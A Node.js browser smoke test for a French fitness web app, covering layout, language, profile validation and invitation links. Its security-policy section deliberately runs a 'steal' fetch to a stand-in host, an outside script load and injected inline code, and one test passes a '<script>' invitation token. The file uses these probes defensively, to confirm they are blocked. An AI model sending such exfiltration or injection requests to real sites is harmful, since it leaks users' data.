// CollabFit web shell, built output served like a static host, strict iPhone simulation (same rules as the DUOFIT suites).
// BROWSER=webkit DEVICE="iPhone 16 Plus" runs it in Safari's engine.
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const BR = require('../../../tests/browser.js');
const IOS = require('../../../tests/iosinit.js');

const dist = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist');
const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.map': 'application/json' };
const server = http.createServer(async (req, res) => {
  const p = new URL(req.url, 'http://x').pathname.replace(/^\/app\//, '/');
  const file = path.join(dist, p === '/' ? 'index.html' : p);
  if (!file.startsWith(dist)) { res.writeHead(403); return res.end(); }
  try { const body = await readFile(file); res.writeHead(200, { 'Content-Type': TYPES[path.extname(file)] || 'application/octet-stream' }); res.end(body); }
  catch { res.writeHead(404); res.end(); }
});
await new Promise(r => server.listen(0, '127.0.0.1', r));
// SMOKE_URL=https://….netlify.app/ tests a deployed build instead; SMOKE_ONLY=csp runs only the security-policy checks
const url = process.env.SMOKE_URL || `http://127.0.0.1:${server.address().port}/app/`;
const ONLY_CSP = process.env.SMOKE_ONLY === 'csp';

const R = []; let fails = 0;
const ok = (n, c, x = '') => { const l = (c ? 'PASS ' : 'FAIL ') + n + (x ? ' — ' + String(x).slice(0, 200) : ''); R.push(l); console.log(l); if (!c) fails++; };
const SAMPLE = JSON.stringify({ p: 'M', d: { M: { logs: [{ date: Date.UTC(2026, 10, 10, 18), wk: 'A', durSec: 2880 }, { date: Date.UTC(2026, 10, 12, 18), wk: 'B', dur: 52 }], cur: { wk: 'C', start: Date.UTC(2026, 10, 14, 18) } }, F: { logs: [], cur: null } } });

const b = await BR.launch();
for (const dev of BR.device ? [BR.device] : ['iPhone SE', 'iPhone 16 Plus']) {
  const ctx = await b.newContext({ ...BR.dev(dev), locale: 'fr-FR', timezoneId: 'Europe/Paris' });
  await ctx.addInitScript(IOS);
  const p = await ctx.newPage(); p.setDefaultTimeout(8000);
  const errs = []; p.on('pageerror', e => errs.push(e.message)); p.on('console', m => { if (m.type() === 'error') errs.push(m.text()); });
  // Netlify's free plan injects its "Powered by" badge script; our policy blocks what it injects (no visible effect).
  // It is Netlify's code, not the app's: replaced by an empty script so the checks below judge the app alone.
  if (process.env.SMOKE_URL) await ctx.route('**/.netlify/scripts/**', r => r.fulfill({ status: 200, contentType: 'text/javascript', body: '' }));
  const text = async () => (await p.textContent('body')).replace(/[  ]/g, ' ');
  const fits = () => p.evaluate(() => document.documentElement.scrollWidth <= innerWidth);
  const tag = `[${dev}] `;

  await p.goto(url);
  ok(tag + 'Home in French, with what exists now and what comes next', (await text()).includes('Disponible maintenant') && (await text()).includes('Compte et connexion sécurisée'));
  const csp = await p.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
  ok(tag + 'Strict security policy: no inline code allowed, no outside site', !csp.includes('unsafe-inline') && csp.includes("script-src 'self'") && csp.includes("connect-src 'self'"), csp);
  ok(tag + 'Fits the screen (no sideways scroll)', await fits());

  // the policy is really enforced by the browser: outside requests, injected inline code and outside scripts are blocked
  const allowed = (/connect-src ([^;]*)/.exec(csp)?.[1] || '').split(' ').find(x => /^https:\/\/[a-z0-9-]+\.supabase\.co$/.test(x)) || null;
  const errsBefore = errs.length; // the blocked requests below are on purpose: their console messages are not app errors
  const v = await p.evaluate(async backend => {
    window.__cspTest = true; window.__ran = false; const seen = [];
    const h = e => seen.push((e.effectiveDirective || e.violatedDirective) + ' ' + e.blockedURI);
    document.addEventListener('securitypolicyviolation', h);
    let outside = 'sent'; try { await fetch('https://example.com/steal?d=1', { mode: 'no-cors' }); } catch { outside = 'blocked'; }
    const img = new Image(); img.src = 'https://example.com/pixel.gif';
    const s1 = document.createElement('script'); s1.textContent = 'window.__ran = true'; document.body.appendChild(s1);
    const s2 = document.createElement('script'); s2.src = 'https://example.com/x.js'; document.body.appendChild(s2);
    let toBackend = null;
    if (backend) { try { await fetch(backend + '/rest/v1/', { mode: 'no-cors' }); } catch { /* network may fail: only the policy matters */ } toBackend = !seen.some(x => x.includes(backend)); }
    const has = d => seen.some(x => x.startsWith(d));
    for (let k = 0; k < 120 && !(has('connect-src') && has('img-src') && has('script-src')); k++) await new Promise(r => requestAnimationFrame(r));
    for (let k = 0; k < 5; k++) await new Promise(r => requestAnimationFrame(r));
    document.removeEventListener('securitypolicyviolation', h); window.__cspTest = false;
    return { outside, ran: window.__ran, seen: [...new Set(seen.map(x => x.split(' ')[0]))].sort(), toBackend };
  }, allowed);
  await p.waitForTimeout(300); errs.splice(errsBefore);
  ok(tag + 'Policy enforced: request, image and script from another site blocked, injected inline code not run',
    v.outside === 'blocked' && !v.ran && ['connect-src', 'img-src', 'script-src'].every(d => v.seen.some(x => x.startsWith(d))), JSON.stringify(v));
  if (allowed) ok(tag + 'Policy lets the app reach its own Supabase project (' + allowed + ')', v.toBackend === true, JSON.stringify(v));
  if (ONLY_CSP) { ok(tag + 'No errors', !errs.length && await p.evaluate(() => window.__nd.length === 0), errs.join(' | ')); await ctx.close(); continue; }

  // training: read-only bridge to DUOFIT
  await p.click('nav a[href="#/training"]');await p.waitForSelector('h1:has-text("Entraînement")');
  ok(tag + 'Training tab without DUOFIT data says so', (await text()).includes('Aucune donnée DUOFIT'));
  ok(tag + '"Ouvrir DUOFIT" leads to the DUOFIT app', (await p.getAttribute('a.button.primary', 'href')) === '../');
  await p.evaluate(s => localStorage.setItem('duofit', s), SAMPLE); await p.reload();
  let t = await text();
  ok(tag + 'With DUOFIT data: workouts counted, in-progress and last workout shown', t.includes('2 séances') && t.includes('Séance en cours · Séance C') && t.includes('Dernière séance : Séance B') && t.includes('52 min'), t.slice(0, 300));
  ok(tag + 'DUOFIT data is never modified', await p.evaluate(s => localStorage.getItem('duofit') === s, SAMPLE));
  await p.evaluate(() => localStorage.setItem('duofit', '{broken')); await p.reload();
  ok(tag + 'Unreadable DUOFIT data: explained, no crash', (await text()).includes('illisibles ici'));
  await p.evaluate(() => localStorage.removeItem('duofit'));

  // profile: name + generated avatar, kept on this phone
  await p.click('nav a[href="#/profile"]');await p.waitForSelector('img.avatar');
  const src0 = await p.getAttribute('img.avatar', 'src');
  ok(tag + 'Generated avatar shown as an image', src0.startsWith('data:image/svg+xml'));
  const type = v => p.locator('input').evaluate((el, v) => { el.focus(); el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); }, v);
  await type('   '); await p.click('button.primary');
  ok(tag + 'Empty name refused', (await text()).includes('Entre un nom.'));
  await type('x'.repeat(41)); await p.click('button.primary');
  ok(tag + 'Too long refused', (await text()).includes('Nom trop long'));
  await type('  Alice   Martin '); await p.click('button.primary');
  ok(tag + 'Name saved, cleaned', (await text()).includes('Enregistré sur ce téléphone.') && (await p.inputValue('input')) === 'Alice Martin');
  await p.reload();
  ok(tag + 'Still there after reopening', (await p.inputValue('input')) === 'Alice Martin');
  await p.click('text=Autre avatar');
  ok(tag + '"Autre avatar" changes it', (await p.getAttribute('img.avatar', 'src')) !== src0);
  await p.click('.seg button:has-text("EN")');
  ok(tag + 'English everywhere, kept after reopening', (await text()).includes('Display name') && (await p.reload(), (await text()).includes('Display name')));
  await p.click('.seg button:has-text("FR")');

  // invitation links opened before accounts exist
  await p.goto(url + '#/join/abcdefghijklmnopqrstuvwxyzAB-_12');
  ok(tag + 'Valid invitation link: acknowledged, kept for this visit only', (await text()).includes('Invitation reçue') && await p.evaluate(() => sessionStorage.getItem('collabfit-invite') === 'abcdefghijklmnopqrstuvwxyzAB-_12' && localStorage.getItem('collabfit-invite') === null));
  await p.goto(url + '#/join/<script>');
  ok(tag + 'Invalid invitation link refused', (await text()).includes('pas valide') && await p.evaluate(() => sessionStorage.getItem('collabfit-invite') === null));
  ok(tag + 'Tabs: current one marked for screen readers', (await p.getAttribute('nav a[aria-current="page"]', 'href')) === '#/spaces');
  ok(tag + 'Fits the screen everywhere', await fits());
  ok(tag + 'No errors, no blocked content, no native dialogs', !errs.length && await p.evaluate(() => window.__nd.length === 0), errs.join(' | '));
  await ctx.close();
}
console.log(`\n${R.length - fails}/${R.length} passed`);
await b.close(); server.close(); process.exit(fails ? 1 : 0);
